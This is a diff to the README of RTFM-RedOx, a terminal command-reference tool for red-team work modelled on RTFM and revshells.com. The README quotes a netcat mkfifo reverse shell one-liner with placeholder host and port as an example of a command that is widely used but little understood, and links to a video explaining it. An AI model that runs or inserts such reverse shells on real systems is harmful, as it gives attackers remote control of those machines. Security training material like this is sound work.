@@ -1,10 +1,10 @@
 RTFM-RedOx is meant to be an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin.  All without the need to leave your terminal to search through notes or open a browser window, or continually run a python script with a lot of switches you'll never remember.  It's basically like having a terminal history and history search for commands you never type in your terminal but often type when you have a shell on a remote host or when interacting with a vulnerable web app.  That being said, the database also contains many commands you'd also run on your attack machine for things like nmap, impacket scripts (adding as I go), crackmapexec, and 
 
-As I've been working on this I've realized this can also be a good learning resource.  For example, many have used the following reverse shell one liner
-'''bash
+As I've been working on this I've realized this can also be a good learning resource.  For example, the following reverse shell one liner has been used by many but is probably not all that well understood.
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f
-'''
-but how many know precisely what that command is actually doing. 0xdf has a [great video](https://www.youtube.com/watch?v=_q_ZCy-hEqg) that does just that. I will be updating references for commands in the database that include deep dive explanations, preferrably to video content, that provide a better understanding of the more complex commands.  The commands in the database from the original RTFM project do have links to websites and many of those are good but some need updating or additional references to more in depth explanations. 
+```
+0xdf has a [great video](https://www.youtube.com/watch?v=_q_ZCy-hEqg) that does just that. I will be updating references for commands in the database that include deep dive explanations, preferrably to video content, that provide a better understanding for more complex commands.  Any commands related to Kerberos, ADCS or Windows authentication in general will benefit from these types of external references to explainers.  The commands in the database from the original RTFM project do have links to websites and many of those are good but some need updating or additional references to more in depth explanations. 
 
 I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I will be gradually adding new commands and pushing the edited db file to the repository.    
 
